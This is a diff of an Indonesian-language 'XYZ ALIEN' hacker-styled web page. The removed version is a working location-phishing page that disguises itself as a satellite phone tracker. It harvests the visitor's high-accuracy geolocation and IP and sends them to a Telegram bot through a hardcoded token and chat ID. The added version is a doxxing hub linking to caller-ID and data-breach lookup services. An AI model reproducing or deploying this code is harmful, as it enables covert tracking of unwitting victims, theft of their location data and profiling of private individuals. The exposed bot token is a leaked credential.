@@ -3,111 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XYZ ALIEN V5.7 - GOLDEN BYPASS</title>
+    <title>XYZ ALIEN V6.0 - DATABREACH</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap');
         :root { --gold: #ffd700; --dark: #000; }
-        * { box-sizing: border-box; }
-        body { background: var(--dark); color: var(--gold); font-family: 'Share Tech Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        body { background: var(--dark); color: var(--gold); font-family: 'Share Tech Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
-        @keyframes rainbow {
-            0% { color: #ff0000; } 25% { color: #ffff00; } 50% { color: #00ff00; } 75% { color: #00ffff; } 100% { color: #ff00ff; }
+        .card { 
+            width: 95%; max-width: 500px; background: #050505; border: 2px solid var(--gold); 
+            padding: 30px; box-shadow: 0 0 25px rgba(255, 215, 0, 0.3); text-align: center;
         }
 
-        .v5-card { 
-            width: 95%; max-width: 450px; background: #050505; border: 2px solid var(--gold); 
-            padding: 30px; box-shadow: 0 0 20px rgba(255, 215, 0, 0.4); text-align: center;
+        h2 { font-family: 'Orbitron'; font-size: 28px; animation: rainbow 4s linear infinite; letter-spacing: 5px; margin-bottom: 5px; }
+        @keyframes rainbow { 0% { color: #ff0000; } 25% { color: #ffff00; } 50% { color: #00ff00; } 75% { color: #00ffff; } 100% { color: #ff00ff; } }
+
+        .osint-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        
+        .osint-item { 
+            border: 1px solid #222; padding: 15px; background: #080808; 
+            cursor: pointer; transition: 0.3s; font-size: 11px; text-transform: uppercase;
         }
+        .osint-item:hover { border-color: var(--gold); background: #111; color: #fff; }
 
-        h2.rainbow { font-family: 'Orbitron'; font-size: 32px; animation: rainbow 4s linear infinite; letter-spacing: 5px; }
-
-        .radar {
-            width: 80px; height: 80px; border: 1px solid var(--gold); border-radius: 50%;
-            margin: 20px auto; position: relative;
+        .terminal { 
+            background: #000; height: 100px; border: 1px solid #111; padding: 10px; 
+            font-size: 10px; color: #b8860b; overflow-y: auto; margin-top: 20px; 
+            text-align: left; border-left: 3px solid var(--gold);
         }
-        .radar::after {
-            content: ''; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px;
-            background: var(--gold); transform-origin: left; animation: rotate 2s linear infinite;
-        }
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-
-        input { width: 100%; background: transparent; border: none; border-bottom: 1px solid #222; color: white; padding: 12px; margin: 10px 0; outline: none; text-align: center; font-family: inherit; }
-        input:focus { border-bottom: 1px solid var(--gold); }
-
-        button { width: 100%; padding: 15px; background: transparent; color: var(--gold); border: 2px solid var(--gold); font-family: 'Orbitron'; cursor: pointer; margin-top: 15px; font-weight: bold; }
-        button:hover { background: var(--gold); color: #000; }
-
-        .terminal { background: #000; height: 120px; border: 1px solid #111; padding: 10px; font-size: 10px; color: #b8860b; overflow-y: auto; margin-top: 20px; text-align: left; border-left: 3px solid var(--gold); }
     </style>
 </head>
 <body>
 
-<div class="v5-card">
-    <h2 class="rainbow">XYZ ALIEN</h2>
-    <div class="radar"></div>
-    <div style="font-size: 10px; margin-bottom: 15px;">SATELLITE INTERFACE V5.7</div>
+<div class="card">
+    <h2>XYZ ALIEN</h2>
+    <div style="font-size: 10px; color: #555; letter-spacing: 2px;">OSINT DATABASE V6.0</div>
 
-    <input type="text" id="phone" placeholder="TARGET PHONE (+62...)">
-    <button onclick="runTracker()">INITIATE UPLINK</button>
+    <div class="terminal" id="term">> AWAITING TARGET IDENTIFICATION...</div>
 
-    <div class="terminal" id="term">> STANDBY...</div>
+    <div class="osint-grid">
+        <div class="osint-item" onclick="openTool('https://www.truecaller.com/')">📞 TrueCaller DB</div>
+        <div class="osint-item" onclick="openTool('https://www.getcontact.com/')">🏷️ GetContact Tag</div>
+        <div class="osint-item" onclick="openTool('https://intelx.io/')">🔓 Intelligence X</div>
+        <div class="osint-item" onclick="openTool('https://leak-lookup.com/')">💧 Leak Lookup</div>
+        <div class="osint-item" onclick="openTool('https://www.sync.me/')">🌐 Sync.ME Search</div>
+        <div class="osint-item" onclick="openTool('https://lookup.robtex.com/')">🛰️ IP/DNS Lookup</div>
+    </div>
+
+    <div style="margin-top: 20px; font-size: 9px; color: #333;">
+        [!] SELECT INTERFACE TO QUERY DATABASE
+    </div>
 </div>
 
 <script>
-    const TOKEN = "8622815738:AAHixf_yecRdOHx1q3LPD0CubKyrszYEH58";
-    const CHAT_ID = "8224363309";
-
     function log(m) {
         const t = document.getElementById('term');
         t.innerHTML = `<div>> ${m}</div>` + t.innerHTML;
     }
 
-    async function report(lat, lon, acc, phone) {
-        log("FETCHING NETWORK DATA...");
-        let net = "Unknown";
-        try {
-            // Pake HTTPS API
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            net = `${d.ip} (${d.org})`;
-        } catch(e) { log("NET_INFO_ERROR: BYPASSING..."); }
-
-        const text = `🎯 <b>TARGET LOCKED!</b>%0A📱 <b>No HP:</b> <code>${phone}</code>%0A📍 <b>Lat:</b> <code>${lat}</code>%0A📍 <b>Lon:</b> <code>${lon}</code>%0A🛰️ <b>Acc:</b> ${acc}m%0A🌐 <b>IP:</b> ${net}%0A🌍 <b>Maps:</b> https://www.google.com/maps?q=${lat},${lon}`;
-
-        log("SENDING TO TELEGRAM...");
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=html`)
-        .then(r => {
-            if(r.ok) {
-                log("UPLINK SUCCESSFUL!");
-                alert("Satellite Link Established!");
-            } else {
-                log("TELEGRAM ERROR: " + r.status);
-            }
-        })
-        .catch(e => log("SEND_ERROR: " + e));
-    }
-
-    function runTracker() {
-        const p = document.getElementById('phone').value;
-        if(!p) return alert("Nomor HP mana, King?");
-
-        log("REQUESTING SATELLITE ACCESS...");
-        
-        if (!navigator.geolocation) {
-            return log("ERROR: HARDWARE NOT SUPPORTED");
-        }
-
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                log("COORDINATES FOUND!");
-                report(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, p);
-            },
-            (err) => {
-                log("ERROR: ACCESS DENIED BY TARGET");
-                alert("Gagal! Izin lokasi ditolak. Target harus klik 'Allow/Izinkan'.");
-            },
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
+    function openTool(url) {
+        log(`REDIRECTING TO EXTERNAL DB: ${url.split('/')[2]}...`);
+        setTimeout(() => {
+            window.open(url, '_blank');
+        }, 1000);
     }
 </script>
 
